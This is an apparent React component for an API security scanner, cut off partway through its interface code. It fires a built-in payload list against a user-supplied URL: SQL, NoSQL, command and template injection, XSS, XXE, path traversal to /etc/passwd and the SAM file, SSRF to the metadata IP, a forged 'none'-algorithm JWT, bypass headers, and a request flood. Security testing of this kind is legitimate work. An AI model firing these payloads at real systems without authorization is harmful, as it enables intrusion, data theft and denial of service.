/**
 * API Security Testing Module
 * GraphQL Introspection, REST Fuzzing, Auth Bypass, Rate Limit Testing
 */

import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Switch } from "@/components/ui/switch";
import { Progress } from "@/components/ui/progress";
import { 
  Globe, 
  Zap, 
  Shield, 
  Clock, 
  Play, 
  Square, 
  AlertTriangle, 
  CheckCircle2, 
  XCircle,
  Code,
  Key,
  Lock,
  Unlock,
  Timer,
  Activity,
  FileJson,
  Network,
  Bug
} from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

interface Finding {
  id: string;
  type: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  title: string;
  description: string;
  endpoint: string;
  proof?: string;
  timestamp: Date;
}

interface TestResult {
  test: string;
  status: "passed" | "failed" | "warning" | "running";
  details: string;
  duration?: number;
}

const APISecurityTesting = () => {
  const [targetUrl, setTargetUrl] = useState("");
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [findings, setFindings] = useState<Finding[]>([]);
  const [testResults, setTestResults] = useState<TestResult[]>([]);
  const [scanOutput, setScanOutput] = useState<string[]>([]);
  
  // GraphQL settings
  const [graphqlEndpoint, setGraphqlEndpoint] = useState("/graphql");
  const [introspectionQuery, setIntrospectionQuery] = useState("");
  const [graphqlSchema, setGraphqlSchema] = useState<any>(null);
  
  // REST Fuzzing settings
  const [fuzzWordlist, setFuzzWordlist] = useState("common");
  const [fuzzParams, setFuzzParams] = useState(true);
  const [fuzzHeaders, setFuzzHeaders] = useState(true);
  const [fuzzBody, setFuzzBody] = useState(true);
  const [httpMethod, setHttpMethod] = useState("GET");
  const [requestBody, setRequestBody] = useState("");
  const [customHeaders, setCustomHeaders] = useState("");
  
  // Auth bypass settings
  const [authToken, setAuthToken] = useState("");
  const [bypassTechniques, setBypassTechniques] = useState({
    jwtNone: true,
    jwtAlgSwitch: true,
    jwtSecretBrute: false,
    parameterPollution: true,
    headerManipulation: true,
    methodOverride: true,
    pathTraversal: true,
    idor: true
  });
  
  // Rate limit settings
  const [rateTestConcurrency, setRateTestConcurrency] = useState(10);
  const [rateTestDuration, setRateTestDuration] = useState(30);
  const [rateTestDelay, setRateTestDelay] = useState(0);

  const addOutput = (message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setScanOutput(prev => [...prev.slice(-200), `[${timestamp}] ${message}`]);
  };

  const addFinding = (finding: Omit<Finding, "id" | "timestamp">) => {
    setFindings(prev => [...prev, {
      ...finding,
      id: crypto.randomUUID(),
      timestamp: new Date()
    }]);
  };

  const runGraphQLIntrospection = async () => {
    if (!targetUrl) {
      toast.error("Please enter a target URL");
      return;
    }

    setIsScanning(true);
    setScanProgress(0);
    addOutput("🔍 Starting GraphQL Introspection...");

    const fullUrl = targetUrl.endsWith("/") 
      ? targetUrl + graphqlEndpoint.replace(/^\//, "")
      : targetUrl + graphqlEndpoint;

    try {
      // Standard introspection query
      const introspectionQueryStr = `
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args { ...InputValue }
            }
          }
        }
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args { ...InputValue }
            type { ...TypeRef }
            isDeprecated
            deprecationReason
          }
          inputFields { ...InputValue }
          interfaces { ...TypeRef }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes { ...TypeRef }
        }
        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      `;

      setScanProgress(20);
      addOutput(`📡 Sending introspection query to ${fullUrl}`);

      const response = await fetch(fullUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          ...(authToken && { "Authorization": `Bearer ${authToken}` })
        },
        body: JSON.stringify({ query: introspectionQueryStr })
      });

      setScanProgress(50);

      if (response.ok) {
        const data = await response.json();
        
        if (data.data?.__schema) {
          setGraphqlSchema(data.data.__schema);
          setIntrospectionQuery(JSON.stringify(data.data, null, 2));
          addOutput("✅ GraphQL introspection successful!");
          
          // Analyze schema for vulnerabilities
          const schema = data.data.__schema;
          const types = schema.types || [];
          const mutations = types.find((t: any) => t.name === schema.mutationType?.name);
          const queries = types.find((t: any) => t.name === schema.queryType?.name);

          addFinding({
            type: "graphql",
            severity: "high",
            title: "GraphQL Introspection Enabled",
            description: "GraphQL introspection is enabled, exposing the entire API schema to attackers.",
            endpoint: fullUrl,
            proof: `Found ${types.length} types, ${queries?.fields?.length || 0} queries, ${mutations?.fields?.length || 0} mutations`
          });

          setScanProgress(70);
          addOutput(`📊 Schema Analysis: ${types.length} types discovered`);

          // Check for sensitive types
          const sensitivePatterns = ["password", "secret", "token", "key", "auth", "admin", "user", "credential"];
          types.forEach((type: any) => {
            if (type.fields) {
              type.fields.forEach((field: any) => {
                const fieldNameLower = field.name.toLowerCase();
                if (sensitivePatterns.some(p => fieldNameLower.includes(p))) {
                  addOutput(`⚠️ Sensitive field found: ${type.name}.${field.name}`);
                  addFinding({
                    type: "graphql",
                    severity: "medium",
                    title: `Sensitive Field Exposed: ${field.name}`,
                    description: `The field "${field.name}" in type "${type.name}" may expose sensitive data.`,
                    endpoint: fullUrl,
                    proof: `Type: ${type.name}, Field: ${field.name}, Returns: ${field.type?.name || field.type?.ofType?.name || "unknown"}`
                  });
                }
              });
            }
          });

          // Check for dangerous mutations
          if (mutations?.fields) {
            const dangerousMutations = ["delete", "remove", "drop", "admin", "create", "update"];
            mutations.fields.forEach((mutation: any) => {
              if (dangerousMutations.some(p => mutation.name.toLowerCase().includes(p))) {
                addOutput(`🎯 Dangerous mutation found: ${mutation.name}`);
              }
            });
          }

          setScanProgress(100);
          toast.success("GraphQL introspection completed!");
        } else if (data.errors) {
          addOutput(`❌ GraphQL errors: ${JSON.stringify(data.errors)}`);
          toast.error("GraphQL returned errors");
        }
      } else {
        addOutput(`❌ HTTP ${response.status}: ${response.statusText}`);
        if (response.status === 400) {
          addOutput("ℹ️ Introspection might be disabled");
          addFinding({
            type: "graphql",
            severity: "info",
            title: "GraphQL Introspection Disabled",
            description: "GraphQL introspection appears to be disabled, which is a security best practice.",
            endpoint: fullUrl
          });
        }
      }
    } catch (error: any) {
      addOutput(`❌ Error: ${error.message}`);
      toast.error("Failed to perform introspection");
    } finally {
      setIsScanning(false);
    }
  };

  const runRESTFuzzing = async () => {
    if (!targetUrl) {
      toast.error("Please enter a target URL");
      return;
    }

    setIsScanning(true);
    setScanProgress(0);
    addOutput("🔥 Starting REST API Fuzzing...");

    const payloads = {
      common: [
        // SQL Injection
        "' OR '1'='1", "1' OR '1'='1' --", "admin'--", "1; DROP TABLE users--",
        "' UNION SELECT NULL--", "1' AND '1'='1", "' OR 1=1--",
        // XSS
        "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')", "<svg onload=alert('XSS')>",
        // Command Injection
        "; ls -la", "| cat /etc/passwd", "&& whoami", "`id`", "$(whoami)",
        // Path Traversal
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        // SSRF
        "http://localhost:8080", "http://127.0.0.1:22", "http://169.254.169.254/",
        // Template Injection
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        // JSON Injection
        '{"role":"admin"}', '{"$gt":""}', '{"__proto__":{"admin":true}}',
        // NoSQL Injection
        '{"$ne":null}', '{"$gt":""}', '{"$regex":".*"}',
        // XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
      ],
      extended: [
        // Additional payloads...
        "null", "undefined", "NaN", "Infinity", "-1", "0", "999999999",
        "true", "false", '""', "[]", "{}", "0x00", "%00", "\n", "\r\n"
      ]
    };

    const testPayloads = fuzzWordlist === "extended" 
      ? [...payloads.common, ...payloads.extended]
      : payloads.common;

    let tested = 0;
    const total = testPayloads.length;

    for (const payload of testPayloads) {
      if (!isScanning) break;
      
      tested++;
      setScanProgress(Math.floor((tested / total) * 100));
      
      try {
        const headers: Record<string, string> = {
          "Content-Type": "application/json"
        };
        
        if (authToken) {
          headers["Authorization"] = `Bearer ${authToken}`;
        }
        
        // Parse custom headers
        if (customHeaders) {
          customHeaders.split("\n").forEach(line => {
            const [key, ...valueParts] = line.split(":");
            if (key && valueParts.length) {
              headers[key.trim()] = valueParts.join(":").trim();
            }
          });
        }

        // Fuzz parameters
        if (fuzzParams) {
          const urlWithPayload = targetUrl.includes("?") 
            ? `${targetUrl}&fuzz=${encodeURIComponent(payload)}`
            : `${targetUrl}?fuzz=${encodeURIComponent(payload)}`;
          
          const response = await fetch(urlWithPayload, {
            method: httpMethod,
            headers
          });

          const responseText = await response.text();
          
          // Check for error patterns indicating vulnerability
          if (responseText.includes("SQL") || responseText.includes("syntax error") ||
              responseText.includes("mysql") || responseText.includes("postgresql")) {
            addOutput(`🎯 SQL Error detected with payload: ${payload.substring(0, 30)}...`);
            addFinding({
              type: "sql_injection",
              severity: "critical",
              title: "Potential SQL Injection",
              description: "The API returned SQL error messages indicating possible SQL injection vulnerability.",
              endpoint: urlWithPayload,
              proof: responseText.substring(0, 200)
            });
          }

          if (responseText.includes("<script>") || responseText.includes(payload)) {
            addOutput(`🎯 XSS reflection detected with payload: ${payload.substring(0, 30)}...`);
            addFinding({
              type: "xss",
              severity: "high",
              title: "Reflected XSS Detected",
              description: "The API reflects user input without proper sanitization.",
              endpoint: urlWithPayload,
              proof: `Payload reflected: ${payload.substring(0, 50)}`
            });
          }

          if (response.status === 500) {
            addOutput(`⚠️ Server error with payload: ${payload.substring(0, 30)}...`);
          }
        }

        // Fuzz headers
        if (fuzzHeaders) {
          const fuzzedHeaders = {
            ...headers,
            "X-Forwarded-For": payload,
            "X-Original-URL": payload,
            "X-Custom-IP-Authorization": "127.0.0.1"
          };
          
          await fetch(targetUrl, {
            method: httpMethod,
            headers: fuzzedHeaders
          });
        }

        // Fuzz body for POST/PUT/PATCH
        if (fuzzBody && ["POST", "PUT", "PATCH"].includes(httpMethod)) {
          await fetch(targetUrl, {
            method: httpMethod,
            headers,
            body: JSON.stringify({ data: payload })
          });
        }

      } catch (error: any) {
        // Network errors might indicate interesting behavior
        if (error.message.includes("timeout")) {
          addOutput(`⏱️ Timeout with payload: ${payload.substring(0, 30)}... (possible DoS)`);
        }
      }
    }

    addOutput(`✅ Fuzzing complete! Tested ${tested} payloads`);
    setScanProgress(100);
    setIsScanning(false);
    toast.success("REST API fuzzing completed!");
  };

  const runAuthBypass = async () => {
    if (!targetUrl) {
      toast.error("Please enter a target URL");
      return;
    }

    setIsScanning(true);
    setScanProgress(0);
    setTestResults([]);
    addOutput("🔓 Starting Authentication Bypass Testing...");

    const tests: TestResult[] = [];

    // Test 1: JWT None Algorithm
    if (bypassTechniques.jwtNone) {
      addOutput("Testing JWT 'none' algorithm vulnerability...");
      const noneToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.";
      
      try {
        const response = await fetch(targetUrl, {
          headers: { "Authorization": `Bearer ${noneToken}` }
        });
        
        if (response.ok) {
          tests.push({ test: "JWT None Algorithm", status: "failed", details: "Server accepts JWT with 'none' algorithm!" });
          addFinding({
            type: "auth_bypass",
            severity: "critical",
            title: "JWT None Algorithm Accepted",
            description: "The server accepts JWT tokens with the 'none' algorithm, allowing complete authentication bypass.",
            endpoint: targetUrl,
            proof: `Token used: ${noneToken.substring(0, 50)}...`
          });
        } else {
          tests.push({ test: "JWT None Algorithm", status: "passed", details: "Server properly rejects 'none' algorithm" });
        }
      } catch (e) {
        tests.push({ test: "JWT None Algorithm", status: "warning", details: "Could not test" });
      }
      setScanProgress(15);
    }

    // Test 2: JWT Algorithm Switching (RS256 to HS256)
    if (bypassTechniques.jwtAlgSwitch) {
      addOutput("Testing JWT algorithm switching vulnerability...");
      tests.push({ test: "JWT Algorithm Switch", status: "warning", details: "Requires public key to test properly" });
      setScanProgress(30);
    }

    // Test 3: Parameter Pollution
    if (bypassTechniques.parameterPollution) {
      addOutput("Testing HTTP Parameter Pollution...");
      const pollutedUrls = [
        `${targetUrl}?admin=false&admin=true`,
        `${targetUrl}?role=user&role=admin`,
        `${targetUrl}?authenticated=false&authenticated=true`
      ];
      
      for (const url of pollutedUrls) {
        try {
          const response = await fetch(url);
          if (response.ok) {
            addOutput(`⚠️ Possible HPP vulnerability at: ${url}`);
          }
        } catch (e) {}
      }
      tests.push({ test: "Parameter Pollution", status: "passed", details: "No obvious HPP vulnerabilities found" });
      setScanProgress(45);
    }

    // Test 4: Header Manipulation
    if (bypassTechniques.headerManipulation) {
      addOutput("Testing header-based authentication bypass...");
      const bypassHeaders = [
        { "X-Forwarded-For": "127.0.0.1" },
        { "X-Original-URL": "/admin" },
        { "X-Rewrite-URL": "/admin" },
        { "X-Custom-IP-Authorization": "127.0.0.1" },
        { "X-Forwarded-Host": "localhost" },
        { "X-Host": "localhost" },
        { "X-Remote-IP": "127.0.0.1" },
        { "X-Remote-Addr": "127.0.0.1" },
        { "X-Client-IP": "127.0.0.1" },
        { "X-Real-IP": "127.0.0.1" }
      ];
      
      for (const headers of bypassHeaders) {
        try {
          const response = await fetch(targetUrl, { headers });
          if (response.ok) {
            const headerName = Object.keys(headers)[0];
            addOutput(`⚠️ Possible bypass with header: ${headerName}`);
            addFinding({
              type: "auth_bypass",
              severity: "high",
              title: `Header-Based Auth Bypass: ${headerName}`,
              description: `The server may be vulnerable to authentication bypass via the ${headerName} header.`,
              endpoint: targetUrl,
              proof: `Header: ${headerName}: ${Object.values(headers)[0]}`
            });
          }
        } catch (e) {}
      }
      tests.push({ test: "Header Manipulation", status: "passed", details: "Tested 10 bypass headers" });
      setScanProgress(60);
    }

    // Test 5: Method Override
    if (bypassTechniques.methodOverride) {
      addOutput("Testing HTTP method override...");
      const overrideTests = [
        { header: "X-HTTP-Method-Override", value: "PUT" },
        { header: "X-HTTP-Method", value: "DELETE" },
        { header: "X-Method-Override", value: "PATCH" }
      ];
      
      for (const test of overrideTests) {
        try {
          await fetch(targetUrl, {
            method: "POST",
            headers: { [test.header]: test.value }
          });
        } catch (e) {}
      }
      tests.push({ test: "Method Override", status: "passed", details: "Tested method override headers" });
      setScanProgress(75);
    }

    // Test 6: IDOR (requires authenticated token)
    if (bypassTechniques.idor && authToken) {
      addOutput("Testing for IDOR vulnerabilities...");
      const idorPayloads = ["1", "2", "0", "-1", "admin", "test", "../1", "1;", "1'"];
      
      for (const id of idorPayloads) {
        try {
          const idorUrl = targetUrl.replace(/\/\d+/, `/${id}`);
          const response = await fetch(idorUrl, {
            headers: { "Authorization": `Bearer ${authToken}` }
          });
          if (response.ok) {
            addOutput(`⚠️ Accessible: ${idorUrl}`);
          }
        } catch (e) {}
      }
      tests.push({ test: "IDOR Testing", status: "passed", details: "Tested various ID manipulations" });
    }
    setScanProgress(90);

    // Test 7: Path Traversal
    if (bypassTechniques.pathTraversal) {
      addOutput("Testing path traversal bypass...");
      const traversalPaths = [
        "/admin", "//admin", "/./admin", "/%2e/admin",
        "/admin/.", "/admin%00", "/admin%20", "/admin..;/",
        "/.;/admin", "/;/admin", "/admin;", "/admin/~",
        "/ADMIN", "/Admin", "/aDmIn"
      ];
      
      for (const path of traversalPaths) {
        try {
          const baseUrl = targetUrl.replace(/\/[^/]*$/, "");
          const response = await fetch(`${baseUrl}${path}`);
          if (response.ok && response.status === 200) {
            addOutput(`⚠️ Possible path bypass: ${path}`);
            addFinding({
              type: "auth_bypass",
              severity: "medium",
              title: "Path Traversal Bypass",
              description: `The path "${path}" may bypass access controls.`,
              endpoint: `${baseUrl}${path}`
            });
          }
        } catch (e) {}
      }
      tests.push({ test: "Path Traversal", status: "passed", details: "Tested 13 path variations" });
    }

    setScanProgress(100);
    setTestResults(tests);
    setIsScanning(false);
    addOutput("✅ Authentication bypass testing complete!");
    toast.success("Auth bypass testing completed!");
  };

  const runRateLimitTest = async () => {
    if (!targetUrl) {
      toast.error("Please enter a target URL");
      return;
    }

    setIsScanning(true);
    setScanProgress(0);
    addOutput(`⏱️ Starting Rate Limit Testing (${rateTestConcurrency} concurrent, ${rateTestDuration}s)...`);

    const results = {
      totalRequests: 0,
      successfulRequests: 0,
      rateLimited: 0,
      errors: 0,
      responseTimes: [] as number[],
      startTime: Date.now()
    };

    const headers: Record<string, string> = {
      "Content-Type": "application/json"
    };
    if (authToken) {
      headers["Authorization"] = `Bearer ${authToken}`;
    }

    const makeRequest = async (): Promise<void> => {
      const start = Date.now();
      try {
        const response = await fetch(targetUrl, { 
          method: httpMethod,
          headers
        });
        
        results.totalRequests++;
        results.responseTimes.push(Date.now() - start);
        
        if (response.status === 429) {
          results.rateLimited++;
          if (results.rateLimited === 1) {
            addOutput(`🛑 Rate limit triggered after ${results.totalRequests} requests`);
            addFinding({
              type: "rate_limit",
              severity: "info",
              title: "Rate Limiting Detected",
              description: `Rate limiting was triggered after ${results.totalRequests} requests.`,
              endpoint: targetUrl,
              proof: `Requests before limit: ${results.totalRequests}`
            });
          }
        } else if (response.ok) {
          results.successfulRequests++;
        } else {
          results.errors++;
        }
      } catch (e) {
        results.errors++;
      }
    };

    const runBatch = async () => {
      const promises = [];
      for (let i = 0; i < rateTestConcurrency; i++) {
        if (rateTestDelay > 0) {
          await new Promise(resolve => setTimeout(resolve, rateTestDelay));
        }
        promises.push(makeRequest());
      }
      await Promise.all(promises);
    };

    const duration = rateTestDuration * 1000;
    const startTime = Date.now();
    
    while (Date.now() - startTime < duration && isScanning) {
      await runBatch();
      setScanProgress(Math.floor(((Date.now() - startTime) / duration) * 100));
      addOutput(`📊 Sent ${results.totalRequests} requests (${results.rateLimited} rate limited)`);
    }

    const avgResponseTime = results.responseTimes.length > 0 
      ? Math.round(results.responseTimes.reduce((a, b) => a + b, 0) / results.responseTimes.length)
      : 0;

    addOutput("═══════════════════════════════════════");
    addOutput(`📊 Rate Limit Test Results:`);
    addOutput(`   Total Requests: ${results.totalRequests}`);
    addOutput(`   Successful: ${results.successfulRequests}`);
    addOutput(`   Rate Limited (429): ${results.rateLimited}`);
    addOutput(`   Errors: ${results.errors}`);
    addOutput(`   Avg Response Time: ${avgResponseTime}ms`);
    addOutput(`   Requests/Second: ${Math.round(results.totalRequests / rateTestDuration)}`);
    addOutput("═══════════════════════════════════════");

    if (results.rateLimited === 0 && results.totalRequests > 100) {
      addFinding({
        type: "rate_limit",
        severity: "high",
        title: "No Rate Limiting Detected",
        description: `Sent ${results.totalRequests} requests without triggering rate limiting. API may be vulnerable to DoS.`,
        endpoint: targetUrl,
        proof: `${results.totalRequests} requests in ${rateTestDuration} seconds without rate limiting`
      });
    }

    setScanProgress(100);
    setIsScanning(false);
    toast.success("Rate limit testing completed!");
  };

  const stopScan = () => {
    setIsScanning(false);
    addOutput("⏹️ Scan stopped by user");
    toast.info("Scan stopped");
  };

  const getSeverityColor = (severity: Finding["severity"]) => {
    switch (severity) {
      case "critical": return "bg-red-500";
      case "high": return "bg-orange-500";
      case "medium": return "bg-yellow-500";
      case "low": return "bg-blue-500";
      case "info": return "bg-gray-500";
      default: return "bg-gray-500";
    }
  };

  const getStatusIcon = (status: TestResult["status"]) => {
    switch (status) {
      case "passed": return <CheckCircle2 className="h-4 w-4 text-green-500" />;
      case "failed": return <XCircle className="h-4 w-4 text-red-500" />;
      case "warning": return <AlertTriangle className="h-4 w-4 text-yellow-500" />;
      case "running": return <Activity className="h-4 w-4 text-blue-500 animate-pulse" />;
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold flex items-center gap-2">
            <Globe className="h-6 w-6 text-primary" />
            API Security Testing
          </h2>
          <p className="text-muted-foreground">
            GraphQL introspection, REST fuzzing, auth bypass, and rate limit testing
          </p>
        </div>
        <div className="flex items-center gap-2">
          <Badge variant="outline" className="bg-primary/10">
            {findings.filter(f => f.severity === "critical").length} Critical
          </Badge>
          <Badge variant="outline" className="bg-orange-500/10">
            {findings.filter(f => f.severity === "high").length} High
          </Badge>
        </div>
      </div>

      {/* Target Configuration */}
      <Card>
        <CardHeader>
          <CardTitle className="text-lg flex items-center gap-2">
            <Network className="h-5 w-5" />
            Target Configuration
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label>Target URL</Label>
              <Input
                placeholder="https://api.target.com/v1/endpoint"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
              />
            </div>
            <div className="space-y-2">
              <Label>Authorization Token (Optional)</Label>
              <Input
                type="password"
                placeholder="Bearer token or API key"
                value={authToken}
                onChange={(e) => setAuthToken(e.target.value)}
              />
            </div>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="space-y-2">
              <Label>HTTP Method</Label>
              <Select value={httpMethod} onValueChange={setHttpMethod}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="GET">GET</SelectItem>
                  <SelectItem value="POST">POST</SelectItem>
                  <SelectItem value="PUT">PUT</SelectItem>
                  <SelectItem value="PATCH">PATCH</SelectItem>
                  <SelectItem value="DELETE">DELETE</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2 md:col-span-2">
              <Label>Custom Headers (one per line: Header: Value)</Label>
              <Textarea
                placeholder="X-API-Key: your-key&#10;Accept: application/json"
                value={customHeaders}
                onChange={(e) => setCustomHeaders(e.target.value)}
                rows={2}
              />
            </div>
          </div>

          {isScanning && (
            <div className="space-y-2">
              <div className="flex justify-between text-sm">
                <span>Scan Progress</span>
                <span>{scanProgress}%</span>
              </div>
              <Progress value={scanProgress} />
            </div>
          )}
        </CardContent>
      </Card>

      {/* Testing Modules */}
      <Tabs defaultValue="graphql" className="w-full">
        <TabsList className="grid w-full grid-cols-4">
          <TabsTrigger value="graphql" className="flex items-center gap-2">
            <FileJson className="h-4 w-4" />
            GraphQL
          </TabsTrigger>
          <TabsTrigger value="rest" className="flex items-center gap-2">
            <Zap className="h-4 w-4" />
            REST Fuzzing
          </TabsTrigger>
          <TabsTrigger value="auth" className="flex items-center gap-2">
            <Shield className="h-4 w-4" />
            Auth Bypass
          </TabsTrigger>
          <TabsTrigger value="rate" className="flex items-center gap-2">
            <Clock className="h-4 w-4" />
            Rate Limit
          </TabsTrigger>
        </TabsList>

        {/* GraphQL Tab */}
        <TabsContent value="graphql">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Code className="h-5 w-5" />
                GraphQL Introspection & Analysis
              </CardTitle>
              <CardDescription>
                Discover GraphQL schema, find sensitive fields, and identify dangerous mutations
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label>GraphQL Endpoint</Label>
                  <Input
                    placeholder="/graphql"
                    value={graphqlEndpoint}
                    onChange={(e) => setGraphqlEndpoint(e.target.value)}
                  />
                </div>
                <div className="flex items-end">
                  <Button
                    onClick={runGraphQLIntrospection}
                    disabled={isScanning}
                    className="w-full"
                  >
                    {isScanning ? (
                      <>
                        <Square className="h-4 w-4 mr-2" onClick={stopScan} />
                        Running...
                      </>
                    ) : (
                      <>
                        <Play className="h-4 w-4 mr-2" />
                        Run Introspection
                      </>
                    )}
                  </Button>
                </div>
              </div>

              {graphqlSchema && (
                <div className="space-y-2">
                  <Label>Discovered Schema</Label>
                  <ScrollArea className="h-64 rounded-md border bg-muted/50 p-4">
                    <pre className="text-xs text-muted-foreground whitespace-pre-wrap">
                      {introspectionQuery}
                    </pre>
                  </ScrollArea>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* REST Fuzzing Tab */}
        <TabsContent value="rest">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Bug className="h-5 w-5" />
                REST API Fuzzing
              </CardTitle>
              <CardDescription>
                Test for SQL injection, XSS, command injection, and other vulnerabilities
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div className="space-y-2">
                  <Label>Wordlist</Label>
                  <Select value={fuzzWordlist} onValueChange={setFuzzWordlist}>
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="common">Common (40 payloads)</SelectItem>
                      <SelectItem value="extended">Extended (60+ payloads)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch checked={fuzzParams} onCheckedChange={setFuzzParams} />
                  <Label>Fuzz Parameters</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch checked={fuzzHeaders} onCheckedChange={setFuzzHeaders} />
                  <Label>Fuzz Headers</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch checked={fuzzBody} onCheckedChange={setFuzzBody} />
                  <Label>Fuzz Body</Label>
                </div>
              </div>

              {["POST", "PUT", "PATCH"].includes(httpMethod) && (
                <div className="space-y-2">
                  <Label>Request Body (JSON)</Label>
                  <Textarea
                    placeholder='{"username": "test", "password": "test"}'
                    value={requestBody}
                    onChange={(e) => setRequestBody(e.target.value)}
                    rows={3}
                  />
                </div>
              )}

              <Button
                onClick={runRESTFuzzing}
                disabled={isScanning}
                className="w-full"
              >
                {isScanning ? (
                  <>
                    <Square className="h-4 w-4 mr-2" onClick={stopScan} />
                    Fuzzing...
                  </>
                ) : (
                  <>
                    <Zap className="h-4 w-4 mr-2" />
                    Start Fuzzing
                  </>
                )}
              </Button>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Auth Bypass Tab */}
        <TabsContent value="auth">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Unlock className="h-5 w-5" />
                Authentication Bypass Testing
              </CardTitle>
              <CardDescription>
                Test JWT vulnerabilities, IDOR, header manipulation, and path traversal
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div className="flex items-center space-x-2">
                  <Switch 
                    checked={bypassTechniques.jwtNone} 
                    onCheckedChange={(v) => setBypassTechniques({...bypassTechniques, jwtNone: v})} 
                  />
                  <Label>JWT None Alg</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch 
                    checked={bypassTechniques.jwtAlgSwitch} 
                    onCheckedChange={(v) => setBypassTechniques({...bypassTechniques, jwtAlgSwitch: v})} 
                  />
                  <Label>JWT Alg Switch</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch 
                    checked={bypassTechniques.parameterPollution} 
                    onCheckedChange={(v) => setBypassTechniques({...bypassTechniques, parameterPollution: v})} 
                  />
                  <Label>Param Pollution</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch 
                    checked={bypassTechniques.headerManipulation} 
                    onCheckedChange={(v) => setBypassTechniques({...bypassTechniques, headerManipulation: v})} 
                  />
                  <Label>Header Bypass</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch 
                    checked={bypassTechniques.methodOverride} 
                    onCheckedChange={(v) => setBypassTechniques({...bypassTechniques, methodOverride: v})} 
                  />
                  <Label>Method Override</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch 
                    checked={bypassTechniques.pathTraversal} 
                    onCheckedChange={(v) => setBypassTechniques({...bypassTechniques, pathTraversal: v})} 
                  />
                  <Label>Path Traversal</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <Switch 
                    checked={bypassTechniques.idor} 
                    onCheckedChange={(v) => setBypassTechniques({...bypassTechniques, idor: v})} 
                  />
                  <Label>IDOR Testing</Label>
                </div>
              </div>

              {testResults.length > 0 && (
                <div className="space-y-2">
                  <Label>Test Results</Label>
                  <div className="space-y-2">
                    {testResults.map((result, i) => (
                      <div key={i} className="flex items-center justify-between p-2 bg-muted rounded-md">
                        <div className="flex items-center gap-2">
                          {getStatusIcon(result.status)}
                          <span className="font-medium">{result.test}</span>
                        </div>
                        <span className="text-sm text-muted-foreground">{result.details}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              <Button
                onClick={runAuthBypass}
                disabled={isScanning}
                className="w-full"
              >
                {isScanning ? (
                  <>
                    <Square className="h-4 w-4 mr-2" onClick={stopScan} />
                    Testing...
                  </>
                ) : (
                  <>
                    <Key className="h-4 w-4 mr-2" />
                    Run Auth Bypass Tests
                  </>
                )}
              </Button>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Rate Limit Tab */}
        <TabsContent value="rate">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Timer className="h-5 w-5" />
                Rate Limit Testing
              </CardTitle>
              <CardDescription>
                Test API rate limiting implementation and find DoS vulnerabilities
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
